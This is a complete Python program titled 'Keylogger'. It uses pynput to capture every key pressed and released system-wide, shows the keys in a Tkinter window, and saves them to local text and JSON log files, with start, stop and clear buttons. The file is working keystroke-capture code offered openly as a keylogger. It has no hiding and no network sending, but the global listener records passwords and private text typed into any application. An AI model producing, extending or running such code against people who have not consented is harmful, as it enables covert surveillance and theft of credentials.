import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    with open('key_log.txt', "w+") as keys_file:
        keys_file.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', 'w') as key_log:
        json.dump(keys_used, key_log, indent=4)

def on_press(key):
    global flag, keys_used
    key_str = str(key).replace("'", "")
    if not flag:
        keys_used.append({'Pressed': key_str})
        flag = True
    else:
        keys_used.append({'Held': key_str})
    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys
    key_str = str(key).replace("'", "")
    keys_used.append({'Released': key_str})
    if flag:
        flag = False
    generate_json_file(keys_used)
    keys += key_str
    generate_text_log(keys)
    log_text.insert(tk.END, key_str + "\n")
    log_text.see(tk.END)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    status_label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    status_label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

def clear_log():
    global keys_used, keys
    keys_used = []
    keys = ""
    log_text.delete('1.0', tk.END)
    generate_json_file(keys_used)
    generate_text_log(keys)

root = tk.Tk()
root.title("Keylogger")

status_label = tk.Label(root, text='Click "Start" to begin keylogging.')
status_label.pack(pady=10)

log_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=50, height=10, state='normal')
log_text.pack(pady=5)

button_frame = tk.Frame(root)
button_frame.pack(pady=10)

start_button = tk.Button(button_frame, text="Start Keylogger", command=start_keylogger)
start_button.pack(side=tk.LEFT, padx=5)

stop_button = tk.Button(button_frame, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=tk.LEFT, padx=5)

clear_button = tk.Button(button_frame, text="Clear Log", command=clear_log)
clear_button.pack(side=tk.LEFT, padx=5)

root.geometry("400x300")
root.mainloop()